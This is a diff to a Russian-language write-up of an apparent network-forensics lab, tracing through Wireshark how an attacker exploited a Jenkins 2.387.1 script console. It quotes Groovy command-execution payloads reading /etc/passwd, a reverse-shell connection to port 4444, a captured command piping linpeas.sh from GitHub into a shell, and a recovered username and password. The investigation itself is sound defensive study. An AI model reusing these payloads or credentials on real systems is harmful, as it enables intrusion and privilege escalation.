@@ -18,11 +18,13 @@
 Поиск по http в строке фильтра Wireshark.
 
 В первом http запросе  вижу:
-    
-    User-Agent: curl/8.15.0
-    
-    + внешний iP 185.220.101.50 инициирует соединение с внутренним хостом 172.16.10.10.
-    
+```
+User-Agent: curl/8.15.0
++ внешний iP 185.220.101.50 инициирует соединение с внутренним хостом 172.16.10.10.
+```
+<img width="248" height="248" alt="1 вопрос" src="https://github.com/user-attachments/assets/997e4642-e0e6-4cc9-ab80-2e756dfff49b" />
+
+
 #### Q2. Какой IP-адрес у C2-сервера атакующего? -  `185.220.101.50`
 
 Фильтр ip.src == 172.16.10.10 && ip.dst != 172.16.0.0/16, увидела:
@@ -34,6 +36,8 @@
     - [TCP Dup ACK] - подтверждение получения
     
  Проверила  `185.220.101.50` в VirusTotal, он оказывается  известным Tor exit node.
+
+ <img width="650" height="200" alt="2 вопрос" src="https://github.com/user-attachments/assets/a4eba2fd-c93c-4742-aca8-3fe1f3b02513" />
 
 #### Q3. Какое веб-приложение и версия были эксплуатированы? -  `Jenkins, 2.387.1`
 
@@ -50,6 +54,8 @@
     </div>
     ```
 
+<img width="204" height="204" alt="3 вопрос" src="https://github.com/user-attachments/assets/b9f823dc-2a31-4f96-a8c1-b731e3fe1171" />
+
 #### Q4. Какой файл атакующий прочитал первым для проверки RCE? -  `/etc/passwd`
 
 1. Рядом нахожу  повторяющиеся post-запросы на `/script`
@@ -63,11 +69,15 @@
     2. println 'id'.execute().text 
     3. println 'cat /etc/passwd'.execute().text
     ```
+<img width="750" height="400" alt="4 вопрос" src="https://github.com/user-attachments/assets/8fdd78aa-5d8b-4a5d-bbce-eb13e7343c4f" />
+
 
 #### Q5. Какой URI-путь у уязвимого эндпоинта? -  `/script`
 
     POST http://172.16.10.10:8080/script HTTP/1.1
     
+<img width="450" height="250" alt="4-5вопрос" src="https://github.com/user-attachments/assets/076a3856-cb6d-4dba-90a4-1b100786351f" />
+
 ---
 ## 2. Execution
 
@@ -88,7 +98,9 @@
     ```
     
  Сразу после этого запроса вижу новое соединение: `172.16.10.10:54322 - 185.220.101.50:4444`
- 
+
+ <img width="700" height="350" alt="6 вопрос" src="https://github.com/user-attachments/assets/d2925f4d-2c28-4dd5-9a96-0c3217d7c334" />
+
  ---
 ## 3. Discovery
 
@@ -99,6 +111,8 @@
 `.[?2004hjenkins@jenkins-web:/$ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 
 Linpeas - это автоматизированный скрипт для поиска способов повышения привилегий в Linux системе.
+
+<img width="700" height="500" alt="7 вопрос" src="https://github.com/user-attachments/assets/638934e8-bd49-4947-95fc-23bea11399e9" />
 
 ---
 
@@ -120,9 +134,13 @@ Linpeas - это автоматизированный скрипт для пои
     TELNET_HOST=172.16.10.20
     ```
 
+<img width="600" height="400" alt="8 вопрос" src="https://github.com/user-attachments/assets/a1a5624a-af4c-48fe-896f-94a4b1ee0bfb" />
+
 #### Q9. Какую комбинацию имени пользователя и пароля использовал злоумышленник для входа во вторую систему?`redis_user:R3d1s_Us3r_P@ss!`
 
 Нашла из  вывода `cat credentials.txt` .
+
+![Uploading 9 вопрос.png…]()
 
 ---
 
